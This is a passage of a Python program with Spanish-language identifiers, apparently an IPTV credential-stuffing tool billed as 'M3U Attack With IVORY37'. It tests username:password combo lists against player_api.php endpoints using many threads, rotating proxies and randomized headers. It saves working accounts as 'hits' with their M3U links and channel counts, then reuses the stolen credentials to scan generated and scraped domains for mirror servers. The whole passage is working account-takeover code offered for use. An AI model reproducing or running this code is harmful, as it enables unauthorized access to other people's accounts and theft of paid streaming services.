                url_series = f"{self.api_url}/player_api.php?username={usuario}&password={contrasena}&action=get_series"
                respuesta_series = requests.get(url_series, timeout=(3, 5), headers=self.obtener_encabezados_aleatorios(), proxies=proxy_seleccionado, verify=False)
                if respuesta_series.status_code == 200:
                    CONTENT_SERIES = respuesta_series.json()
                    contador = len(CONTENT_SERIES)
                    if COUNT_SERIES is None:
                        COUNT_SERIES = 0
                    COUNT_SERIES += contador
                    return contador
                else:
                    print(f"{Fore.RED}❌ Error obteniendo series (intento {intento + 1}/{reintentos}): Código {respuesta_series.status_code}{Style.RESET_ALL}")
            except requests.RequestException as e:
                print(f"{Fore.RED}❌ Error obteniendo series (intento {intento + 1}/{reintentos}): {str(e)[:50]}{Style.RESET_ALL}")
            if intento < reintentos - 1:
                time.sleep(0.5)
        return 0

    def resolver_ip(self, dominio):
        try:
            r = requests.get(f"http://ip-api.com/json/{dominio}", timeout=2)
            if r.status_code == 200:
                datos = r.json()
                ip = datos.get("query", "❓")
                pais = datos.get("country", "❓")
                codigo = datos.get("countryCode", "")
                ciudad = datos.get("city", "❓")
                bandera = chr(0x1F1E6 + ord(codigo.upper()[0]) - ord('A')) + chr(0x1F1E6 + ord(codigo.upper()[1]) - ord('A')) if codigo else ""
                return ip, ciudad, pais, bandera
        except:
            return "❓", "❓", "❓", ""

    def es_espejo_valido(self, url, timeout=2):
        sesion = requests.Session()
        for intento in range(Config.MIRROR_RETRIES):
            try:
                encabezados = self.obtener_encabezados_aleatorios()
                r = sesion.get(url, headers=encabezados, timeout=timeout, verify=False)
                if r.status_code == 200 and '"status":"Active"' in r.text:
                    return True
                return False
            except:
                if intento == Config.MIRROR_RETRIES - 1:
                    return False
                time.sleep(0.5)
        return False

    def escanear_espejos(self, usuario, contrasena):
        espejos = []
        os.makedirs(Config.MIRROR_DIR, exist_ok=True)
        
        # Fuentes de dominios en línea
        fuentes_dominios = [
            "https://raw.githubusercontent.com/iptv-org/iptv/main/README.md",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        ]
        
        # Dominios generados a partir del dominio principal
        dominio_principal = self.api_url.replace("http://", "").replace("https://", "").split('/')[0].split(':')[0]
        tlds = ['.com', '.tv', '.xyz', '.club', '.cc', '.net', '.org', '.info']
        dominios_generados = [dominio_principal] + [dominio_principal.split('.')[0] + tld for tld in tlds]
        dominios_generados += [f"sub{i}.{dominio_principal}" for i in range(1, 4)]
        
        # Obtener dominios de fuentes en línea
        servidores = set(dominios_generados)
        for index, url in enumerate(fuentes_dominios, start=1):
            try:
                response = requests.get(url, timeout=(5,10), headers=self.obtener_encabezados_aleatorios())
                if response.status_code != 200:
                    print(f"{Fore.RED}❌ Error obteniendo dominios desde fuente [{index}]: {response.status_code}{Style.RESET_ALL}")
                    continue
                dominios = re.findall(r"(?:https?://)?([\w.-]+)(?::\d+)?(?:/.*)?", response.text)
                dominios = [d for d in dominios if re.match(r"^[a-zA-Z0-9\.\-_]+$", d)]
                servidores.update(dominios)
                print(f"{Fore.GREEN}✅ Obtenidos {len(dominios)} dominios desde fuente [{index}]{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}❌ Error obteniendo dominios desde fuente [{index}]: {str(e)[:20]}{Style.RESET_ALL}")

        # Si hay dominios.txt, incluirlo como respaldo
        if os.path.exists(Config.DOMAINS_FILE):
            try:
                with open(Config.DOMAINS_FILE, 'r', encoding='utf-8') as f:
                    dominios_archivo = [linea.strip() for linea in f if linea.strip() and re.match(r"^[a-zA-Z0-9\.\-_]+$", linea.strip())]
                    servidores.update(dominios_archivo)
                    print(f"{Fore.CYAN}📥 Cargados {len(dominios_archivo)} dominios desde {Config.DOMAINS_FILE}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}⚠️ Error leyendo dominios.txt: {e}{Style.RESET_ALL}")

        if not servidores:
            print(f"{Fore.RED}⚠️ No hay dominios para escanear{Style.RESET_ALL}")
            return espejos

        servidores = list(dict.fromkeys(servidores))  # Eliminar duplicados
        servidores_prioridad = [s for s in servidores if any(s.endswith(tld) for tld in Config.PRIORITY_TLDS)]
        otros_servidores = [s for s in servidores if not any(s.endswith(tld) for tld in Config.PRIORITY_TLDS)]
        servidores = servidores_prioridad + otros_servidores
        if dominio_principal not in servidores:
            servidores.insert(0, dominio_principal)

        estado.total_dominios = len(servidores)
        estado.dominios_probados = 0
        estado.dominios_probados_set.clear()
        estado.dominios_recientes.clear()
        estado.dominios_escaneados.clear()

        def escanear_dominio(servidor):
            servidor = servidor.replace("http://", "").replace("https://", "").split("/")[0]
            dominio_con_puerto = f"{servidor}:{estado.puerto_servidor_principal}"
            
            if servidor in Config.BLOCKED_DOMAINS or dominio_con_puerto in estado.dominios_escaneados:
                with estado._lock:
                    estado.dominios_probados += 1
                    estado.dominios_recientes.append(f"{dominio_con_puerto} (Omitido)")
                    if len(estado.dominios_recientes) > 5:
                        estado.dominios_recientes.pop(0)
                return
            
            url_prueba = f"http://{dominio_con_puerto}/player_api.php?username={usuario}&password={contrasena}&type=m3u"
            with estado._lock:
                estado.dominios_recientes.append(dominio_con_puerto)
                estado.dominios_escaneados.add(dominio_con_puerto)
                if len(estado.dominios_recientes) > 5:
                    estado.dominios_recientes.pop(0)
            
            if self.es_espejo_valido(url_prueba, timeout=Config.MIRROR_TIMEOUT):
                ip, ciudad, pais, bandera = self.resolver_ip(servidor)
                entrada_espejo = f"✅ http://{dominio_con_puerto} | IP: {ip} | Geo: {bandera} {ciudad}, {pais}"
                espejos.append(entrada_espejo)
                with estado._lock:
                    estado.lista_espejos.append(entrada_espejo)
                    self.escribir(f"Espejo encontrado: {entrada_espejo}\n")
            
            with estado._lock:
                estado.dominios_probados += 1

        with ThreadPoolExecutor(max_workers=Config.MAX_WORKERS_MIRRORS) as executor:
            executor.map(escanear_dominio, servidores)
            executor._threads.clear()
        
        print(f"{Fore.YELLOW}⚠️ Escaneo de espejos completado: {len(espejos)} servidores válidos encontrados{Style.RESET_ALL}")
        return espejos

    def escribir(self, texto):
        try:
            os.makedirs(Config.MIRROR_DIR, exist_ok=True)
            archivo_espejo = os.path.join(Config.MIRROR_DIR, f"espejos_{self.api_url.replace(':', '_').replace('/', '_')}.txt")
            if not os.access(Config.MIRROR_DIR, os.W_OK):
                print(f"{Fore.RED}⚠️ Sin permisos de escritura en {Config.MIRROR_DIR}{Style.RESET_ALL}")
                return

            with open(archivo_espejo, 'a', encoding='utf-8') as archivo:
                if not os.path.exists(archivo_espejo + ".escrito"):
                    archivo.write(f"═══════ ESPEJOS ═══════\n")
                    with open(archivo_espejo + ".escrito", 'w') as marcador:
                        marcador.write("hecho")
                archivo.write(texto)
                archivo.flush()
        except Exception as e:
            print(f"{Fore.RED}⚠️ Error escribiendo en archivo: {e}{Style.RESET_ALL}")

    def guardar_usuario_valido(self, linea_usuario, datos_respuesta, proxy_seleccionado):
        try:
            os.makedirs(Config.HITS_DIR, exist_ok=True)
            os.makedirs(Config.HITS_COMBO_DIR, exist_ok=True)
            self.archivo_salida = os.path.join(Config.HITS_DIR, f"{self.api_url.replace(':', '_').replace('/', '_')}.txt")
            self.archivo_combo = os.path.join(Config.HITS_COMBO_DIR, f"{self.api_url.replace(':', '_').replace('/', '_')}.txt")

            info_usuario = datos_respuesta["user_info"]
            info_servidor = datos_respuesta["server_info"]

            fecha_expiracion = "Ilimitado"
            expiracion_raw = info_usuario.get("exp_date")
            if expiracion_raw is not None:
                try:
                    timestamp_expiracion = int(expiracion_raw)
                    fecha_expiracion = datetime.datetime.fromtimestamp(timestamp_expiracion).strftime('%Y-%m-%d %H:%M:%S')
                except (ValueError, TypeError):
                    fecha_expiracion = "Ilimitado"

            es_xui = "Sí" if info_servidor.get("xui", False) else "No"
            url_m3u = f"{self.api_url}/get.php?username={info_usuario['username']}&password={info_usuario['password']}&type=m3u_plus"
            tipo_escaneo = "Escáner M3U con Proxy" if self.usar_proxies else "Escáner M3U"

            usuario = info_usuario.get('username')
            contrasena = info_usuario.get('password')

            contador_tv = self.obtener_contador_transmisiones_vivo(usuario, contrasena, proxy_seleccionado=proxy_seleccionado) if COUNT_LIVE in [None, 0] else COUNT_LIVE
            contador_peliculas = self.obtener_contador_vod(usuario, contrasena, proxy_seleccionado=proxy_seleccionado) if COUNT_MOVIES in [None, 0] else COUNT_MOVIES
            contador_series = self.obtener_contador_series(usuario, contrasena, proxy_seleccionado=proxy_seleccionado) if COUNT_SERIES in [None, 0] else COUNT_SERIES

            texto_categorias = ""
            if self.incluir_categorias:
                texto_categorias = self.obtener_categorias(usuario, contrasena, proxy_seleccionado)
                texto_categorias = f"""
             📺 CATEGORÍAS TV
 ──────────────────────────── 
{texto_categorias} 
 ──────────────────────────── 
"""

            salida = f"""
            Ⲙ𝟑∪ 🜲 ESCÁNER ᵇʸ ᴵⱽᴼᴿʸ³⁷  
────────────────────────────────────────────

⚙️ Información del Servidor
┌────────────────────────────────────────────┐
│ 👤 Autor: {self.nick}                      
│ 💻 Script: M3U Scanner by IVORY37          
│ 🌐 Portal: {self.api_url}                  
│ 🔗 URL Real: {info_servidor['url']}:{info_servidor['port']} 
│ 📡 Puerto: {info_servidor['port']}           
│ 🧩 Usuario: {info_usuario['username']}        
│ 🔑 Clave: {info_usuario['password']}          
│ ⏳ Expira: {fecha_expiracion}                      
│ 🔢 Conexiones Activas: {info_usuario['active_cons']} 
│ ♾️ Máx. Conexiones: {info_usuario['max_connections']} 
│ 🚦 Estado: {info_usuario['status']}           
│ 🌍 Zona Horaria: {info_servidor['timezone']} 
│ 🧭 XUI: {es_xui}                           
│ 🔍 Tipo de Escaneo: {tipo_escaneo}            
└────────────────────────────────────────────┘

📺 CONTENIDO DISPONIBLE
┌────────────────────────────────────────────┐
│ 📡 TV en Vivo: {contador_tv}                   
│ 🎬 Películas: {contador_peliculas}                
│ 📺 Series: {contador_series}                   
└────────────────────────────────────────────┘
{texto_categorias}

🔗 ENLACE M3U
┌────────────────────────────────────────────┐
│ 📂 URL: {url_m3u}                          
│ 🧠 Generado por: ᴵⱽᴼᴿʸ³⁷                  
│ ⚔️ Proyecto: M3U Attack With IVORY37       
└────────────────────────────────────────────┘ 
"""

            with open(self.archivo_salida, 'a', encoding='utf-8') as f:
                f.write(salida)
                f.flush()
            print(f"{Fore.GREEN}✅ Acierto guardado en: {self.archivo_salida}{Style.RESET_ALL}")

            salida_combo = f"{info_usuario['username']}:{info_usuario['password']}\n"
            with open(self.archivo_combo, 'a', encoding='utf-8') as f:
                f.write(salida_combo)
                f.flush()
            print(f"{Fore.GREEN}✅ Combo guardado en: {self.archivo_combo}{Style.RESET_ALL}")

            with self.lock:
                estado.aciertos += 1
                if not estado.primer_acierto_procesado:
                    estado.usuario_espejo = usuario
                    estado.contrasena_espejo = contrasena
                    estado.primer_acierto_procesado = True
                    hilo_espejo = threading.Thread(target=self.escanear_espejos, args=(usuario, contrasena))
                    hilo_espejo.start()

        except Exception as e:
            print(f"{Fore.RED}❌ Error guardando acierto: {str(e)}{Style.RESET_ALL}")

    def formatear_tiempo_transcurrido(self, tiempo_transcurrido):
        segundos_totales = int(tiempo_transcurrido)
        dias = segundos_totales // (24 * 3600)
        horas = (segundos_totales % (24 * 3600)) // 3600
        minutos = (segundos_totales % 3600) // 60
        segundos = segundos_totales % 60
        
        partes = []
        if dias > 0:
            partes.append(f"{dias}d")
        if horas > 0 or dias > 0:
            partes.append(f"{horas}h")
        partes.append(f"{minutos}m")
        partes.append(f"{segundos}s")
        return " ".join(partes)

    def obtener_bandera_pais(self, codigo_pais):
        try:
            return ''.join(chr(127397 + ord(c)) for c in codigo_pais.upper())
        except:
            return '🏳️'

    def generar_estadisticas(self, codigo_estado, linea_usuario=None):
        if not Config.DEBUG_MODE:
            os.system('cls' if os.name == 'nt' else 'clear')

        tiempo_transcurrido = max(time.time() - self.tiempo_inicio, 1)
        delta = time.time() - self.calculo_cpm
        if delta >= 1:
            self.valor_cpm = round(self.total_procesados / delta * 60)
            self.calculo_cpm = time.time()

        porcentaje = (self.total_procesados / self.total_usuarios * 100) if self.total_usuarios > 0 else 0
        if porcentaje >= 100:
            porcentaje = 100.0
        ancho_barra = 20
        llenado = int((porcentaje / 100) * ancho_barra)
        vacio = ancho_barra - llenado
        barra = f"\033[38;5;124m" + "█" * llenado + f"\033[38;5;238m" + "─" * vacio + "\033[0m"

        tiempo_inicio_str = time.strftime("%Y-%m-%d • %I:%M %p", time.localtime(self.tiempo_inicio))
        tiempo_transcurrido_str = self.formatear_tiempo_transcurrido(tiempo_transcurrido)
        linea_usuario_mostrar = linea_usuario if linea_usuario else "N/A"
        usuario, contrasena = linea_usuario_mostrar.split(':') if linea_usuario else ("N/A", "N/A")
        usuario = usuario[:28].ljust(28)
        contrasena = contrasena[:28].ljust(28)

        pais = self.informacion_servidor.info.get('country', 'N/A') if self.informacion_servidor.info else 'N/A'
        codigo_pais = self.informacion_servidor.info.get('countryCode', 'N/A') if self.informacion_servidor.info else 'N/A'
        ciudad = self.informacion_servidor.info.get('city', 'N/A') if self.informacion_servidor.info else 'N/A'
        isp = self.informacion_servidor.info.get('isp', 'N/A') if self.informacion_servidor.info else 'N/A'
        zona_horaria = self.informacion_servidor.info.get('timezone', 'N/A') if self.informacion_servidor.info else 'N/A'
        bandera = self.obtener_bandera_pais(codigo_pais)

        color_dinamico = Config.COLORS[(self.total_procesados // 10) % len(Config.COLORS)]
        contador_aciertos = f"\033[42m\033[1;33m {self.usuarios_validos} \033[0m" if self.usuarios_validos > 0 else f"\033[41m\033[37m {self.usuarios_validos} \033[0m"

        lineas_proxy = ""
        if self.usar_proxies:
            lineas_proxy = (
                f"{Fore.CYAN}🔄 ┌──[ESTADO DE PROXIES]──────────────\n"
                f"{Fore.CYAN}   │  Actual: {Fore.WHITE}{self.administrador_proxies.current_proxy or 'Ninguno'}\n"
                f"{Fore.CYAN}   │  Activos: {Fore.GREEN}{self.administrador_proxies.contador_activos} {Fore.CYAN}| Baneados: {Fore.RED}{self.administrador_proxies.contador_baneados}\n"
                f"{Fore.CYAN}   │  Verificaciones Fallidas: {Fore.RED}{self.usuarios_invalidos}\n"
                f"{Fore.CYAN}   └─────────────────────────────\n"
            )

        tiempo_actual = time.time()
        diferencia_tiempo = tiempo_actual - estado.ultima_verificacion_tiempo
        if diferencia_tiempo > 0:
            estado.dominios_probados_por_segundo = (estado.dominios_probados - estado.ultimos_dominios_probados) / diferencia_tiempo
            estado.ultimos_dominios_probados = estado.dominios_probados
            estado.ultima_verificacion_tiempo = tiempo_actual

        longitud_barra = 28
        porcentaje_espejos = (estado.dominios_probados / estado.total_dominios * 100) if estado.total_dominios else 0
        longitud_llenado = int(longitud_barra * porcentaje_espejos / 100)
        barra_espejos = "█" * longitud_llenado + "─" * (longitud_barra - longitud_llenado)

        espejos_mostrar = "\n".join(estado.lista_espejos[-5:]) if estado.lista_espejos else "Ninguno"
        seccion_espejos = f"{Fore.CYAN}🪞 ┌──[ESPEJOS ENCONTRADOS]─────────────────\n{Fore.GREEN}{espejos_mostrar}\n{Fore.CYAN}   └─────────────────────────────\n"

        estadisticas = (
            f"{banner}\n"
            f"{Fore.CYAN}📊 ┌──[ESTADO DEL ESCANEO]───────────────\n"
            f"{Fore.CYAN}   │  Inicio: {Fore.WHITE}{tiempo_inicio_str}\n"
            f"{Fore.CYAN}   │  Tiempo: {Fore.WHITE}{tiempo_transcurrido_str}\n"
            f"{Fore.CYAN}   │  Estado: {Fore.WHITE}{codigo_estado}\n"
            f"{Fore.CYAN}   │  Error: {Fore.RED}{self.ultimo_error}\n"
            f"{Fore.CYAN}   │  Bot: {Fore.MAGENTA}{str(self.hilo_actual or 'N/A'):<6} {Fore.CYAN}| CPM: {Fore.MAGENTA}{self.valor_cpm}\n"
            f"{Fore.CYAN}   │  Usuario: {Fore.WHITE}{usuario}\n"
            f"{Fore.CYAN}   │  Contraseña: {Fore.WHITE}{contrasena}\n"
            f"{Fore.CYAN}   └─────────────────────────────\n"
            f"{lineas_proxy}"
            f"{Fore.CYAN}🌐 ┌──[INFORMACIÓN DEL SERVIDOR]──────────────\n"
            f"{Fore.CYAN}   │  Servidor: {Fore.GREEN}{self.api_url}\n"
            f"{Fore.CYAN}   │  País: {Fore.MAGENTA}{bandera} {pais} [{codigo_pais}]\n"
            f"{Fore.CYAN}   │  Ciudad: {Fore.WHITE}{ciudad}\n"
            f"{Fore.CYAN}   │  ISP: {Fore.WHITE}{isp}\n"
            f"{Fore.CYAN}   │  Zona Horaria: {Fore.WHITE}{zona_horaria}\n"
            f"{Fore.CYAN}   └─────────────────────────────\n"
            f"{Fore.CYAN}📈 ┌──[PROGRESO]─────────────────\n"
            f"{Fore.CYAN}   │  {barra:<{ancho_barra}} {Fore.GREEN}{porcentaje:.2f}%{Fore.CYAN}\n"
            f"{Fore.CYAN}   └─────────────────────────────\n"
            f"{Fore.YELLOW}🎯 Aciertos: {contador_aciertos}\n"
            f"{Fore.CYAN}🔄 ┌──[PROGRESO DE ESPEJOS]─────────────────\n"
            f"{Fore.CYAN}   │  Progreso: [{Fore.GREEN}{barra_espejos}{Fore.RESET}] {estado.dominios_probados}/{estado.total_dominios} ({porcentaje_espejos:.1f}%)\n"
            f"{Fore.CYAN}   │  Velocidad: {estado.dominios_probados_por_segundo:.1f} dominios/s\n"
            f"{Fore.CYAN}   └─────────────────────────────\n"
            f"{seccion_espejos}"
            f"{Fore.CYAN}⚡ Desarrollado por ᴵⱽᴼᴿʸ³⁷{Style.RESET_ALL}"
        )

        print(estadisticas)

    def procesar_archivo(self, ruta_archivo):
        usuarios = ManejadorArchivos.leer_usuarios(ruta_archivo)
        self.total_usuarios = len(usuarios)
        
        if not usuarios:
            print(f"{Fore.RED}❌ Archivo combo vacío{Style.RESET_ALL}")
            return

        entrada_nick = input(f"{Fore.CYAN}👤 ┌──[INGRESA TU NOMBRE]───────────\n{Fore.CYAN}   └──> {Fore.WHITE}").strip()
        self.nick = entrada_nick if entrada_nick else "IVORY37"

        print(f"""
{Fore.CYAN}⚔️ ┌──[SELECCIONA TIPO DE ATAQUE]────────
{Fore.CYAN}   │  {Fore.YELLOW}1) {Fore.WHITE}Ataque Aleatorio
{Fore.CYAN}   │  {Fore.YELLOW}2) {Fore.WHITE}Ataque Preciso
{Fore.CYAN}   └──> {Fore.WHITE}""")
        eleccion_ataque = input().strip()
        self.encabezados_ataque = self.obtener_configuracion_ataque(eleccion_ataque)['headers']

        self.incluir_categorias = input(f"{Fore.CYAN}📺 ┌──[¿INCLUIR CATEGORÍAS DE CANALES?]───────\n{Fore.CYAN}   │  {Fore.YELLOW}1) {Fore.WHITE}Sí\n{Fore.CYAN}   │  {Fore.YELLOW}2) {Fore.WHITE}No\n{Fore.CYAN}   └──> {Fore.WHITE}").lower() == '1'

        self.usar_proxies = input(f"{Fore.CYAN}🔄 ┌──[¿USAR PROXIES?]──────────────\n{Fore.CYAN}   │  {Fore.YELLOW}1) {Fore.WHITE}Sí\n{Fore.CYAN}   │  {Fore.YELLOW}2) {Fore.WHITE}No\n{Fore.CYAN}   └──> {Fore.WHITE}").lower() == '1'
        
        if self.usar_proxies:
            fuente_proxy = input(f"{Fore.CYAN}📥 ┌──[FUENTE DE PROXIES]──────────────\n{Fore.CYAN}   │  {Fore.YELLOW}1) {Fore.WHITE}En línea\n{Fore.CYAN}   │  {Fore.YELLOW}2) {Fore.WHITE}Archivo Local\n{Fore.CYAN}   └──> {Fore.WHITE}").lower()
            if fuente_proxy == '1':
                if not self.administrador_proxies.obtener_proxies():
                    print(f"{Fore.RED}❌ No hay proxies gratuitos disponibles{Style.RESET_ALL}")
                    return
            elif fuente_proxy == '2':
                self.administrador_proxies.seleccionar_tipo_proxy()
                directorio_proxies = Config.PROXIES_DIR
                try:
                    os.makedirs(directorio_proxies, exist_ok=True)
                    archivos_proxy = [f for f in os.listdir(directorio_proxies) if os.path.isfile(os.path.join(directorio_proxies, f))]
                    if not archivos_proxy:
                        print(f"{Fore.RED}❌ No se encontraron archivos de proxies en {directorio_proxies}{Style.RESET_ALL}")
                        return
                    print(f"{Fore.CYAN}📂 ┌──[ARCHIVOS DE PROXY DISPONIBLES]──")
                    for i, archivo in enumerate(archivos_proxy, 1):
                        print(f"{Fore.CYAN}   │  {Fore.YELLOW}{i}. {Fore.WHITE}{archivo}")
                    print(f"{Fore.CYAN}   └──> ", end="")
                    while True:
                        try:
                            eleccion = int(input(f"{Fore.WHITE}"))
                            if 1 <= eleccion <= len(archivos_proxy):
                                archivo_seleccionado = os.path.join(directorio_proxies, archivos_proxy[eleccion - 1])
                                break
                            print(f"{Fore.RED}❌ Elige un número entre 1 y {len(archivos_proxy)}{Style.RESET_ALL}")
                        except ValueError:
                            print(f"{Fore.RED}❌ Ingresa un número válido{Style.RESET_ALL}")
                    if not self.administrador_proxies.obtener_proxies(archivo_proxy=archivo_seleccionado):
                        print(f"{Fore.RED}❌ Falló al cargar proxies desde archivo{Style.RESET_ALL}")
                        return
                except Exception as e:
                    print(f"{Fore.RED}❌ Error accediendo a {directorio_proxies}: {str(e)[:20]}{Style.RESET_ALL}")
                    return
            else:
                print(f"{Fore.RED}❌ Opción inválida. Proxies deshabilitados.{Style.RESET_ALL}")
                self.usar_proxies = False

            if self.usar_proxies:
                optimizar_proxies = input(f"{Fore.CYAN}🎯 ┌──[¿OPTIMIZAR PROXIES PARA OBJETIVO?]───────\n{Fore.CYAN}   │  {Fore.YELLOW}1) {Fore.WHITE}Sí\n{Fore.CYAN}   │  {Fore.YELLOW}2) {Fore.WHITE}No\n{Fore.CYAN}   └──> {Fore.WHITE}").lower() == '1'
                if optimizar_proxies:
                    try:
                        timeout = int(input(f"{Fore.CYAN}⏱️ ┌──[TIMEOUT PARA VERIFICACIÓN (3-10)]───────\n{Fore.CYAN}   └──> {Fore.WHITE}") or 5)
                        timeout = max(3, min(10, timeout))
                    except ValueError:
                        timeout = 5
                    verbose = input(f"{Fore.CYAN}🔊 ┌──[¿SALIDA DETALLADA?]───────\n{Fore.CYAN}   │  {Fore.YELLOW}1) {Fore.WHITE}Sí\n{Fore.CYAN}   │  {Fore.YELLOW}2) {Fore.WHITE}No\n{Fore.CYAN}   └──> {Fore.WHITE}").lower() == '1'
                    self.administrador_proxies.verificar_proxies_contra_objetivo(self.api_url, timeout=timeout, verbose=verbose)
            
        print(f"{Fore.GREEN}✅ Cargados {self.total_usuarios} usuarios{Style.RESET_ALL}")
        with ThreadPoolExecutor(max_workers=self.num_hilos) as executor:
            try:
                if self.usar_proxies:
                    executor.map(self.validar_usuario, usuarios)
                else:
                    executor.map(self.validar_usuario_sin_proxy, usuarios)
            except RuntimeError as e:
                print(f"{Fore.RED}{str(e)}. Proceso terminado.{Style.RESET_ALL}")
                self.generar_estadisticas("Falló")
                return

        print(f"{Fore.GREEN}✅ Escaneo completado{Style.RESET_ALL}")
        self.generar_estadisticas("Ok")
        print(f"\n{Fore.GREEN}[✅] Resultados totales ⪼ {Fore.WHITE}{self.total_usuarios} combos escaneados")
        print(f"{Fore.GREEN}[✅] Activos ⪼ {Fore.WHITE}{self.usuarios_validos}")
        print(f"{Fore.GREEN}[❌] Inactivos ⪼ {Fore.WHITE}{self.usuarios_invalidos}\n")
        print(f"{Fore.LIGHTCYAN_EX}⚡ Ataque M3U con ᴵⱽᴼᴿʸ³⁷{Style.RESET_ALL}")

def limpiar_url(url: str) -> str:
    parsed = urlparse(url)
    scheme = "http"
    netloc = parsed.netloc if parsed.netloc else parsed.path
    return f"{scheme}://{netloc}"

def obtener_num_hilos() -> int:
    while True:
        try:
            num = int(input(f"{Fore.CYAN}🧵 ┌──[NÚMERO DE HILOS (1-50)]──────────\n{Fore.CYAN}   └──> {Fore.WHITE}"))
            if 1 <= num <= 50:
                return num
            print(f"{Fore.RED}❌ El número debe estar entre 1 y 50{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}❌ Ingresa solo números{Style.RESET_ALL}")

def imprimir_banner():
    lineas = banner.split('\n')
    for linea in lineas:
        print(linea)
        time.sleep(0.2)

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    imprimir_banner()
    num_hilos = obtener_num_hilos()
    os.system('cls' if os.name == 'nt' else 'clear')
    imprimir_banner()
    entrada_url_api = input(f"{Fore.CYAN}🌐 ┌──[HOST:PUERTO o URL M3U]──────\n{Fore.CYAN}   └──> {Fore.WHITE}")
    url_api = limpiar_url(entrada_url_api)
    try:
        estado.puerto_servidor_principal = url_api.split(':')[2] if len(url_api.split(':')) > 2 else "8080"
        print(f"{Fore.YELLOW}⚠️ Usando puerto del servidor principal: {estado.puerto_servidor_principal}{Style.RESET_ALL}")
    except IndexError:
        estado.puerto_servidor_principal = "8080"
        print(f"{Fore.YELLOW}⚠️ Puerto no especificado en servidor principal. Usando puerto por defecto: 8080{Style.RESET_ALL}")
    validador = ValidadorIPTV(url_api, num_hilos)
    ruta_archivo = ManejadorArchivos.listar_archivos()
    if ruta_archivo:
        validador.procesar_archivo(ruta_archivo)
    else:
        print(f"{Fore.RED}❌ No se seleccionó archivo combo{Style.RESET_ALL}")

if __name__ == "__main__":
    main()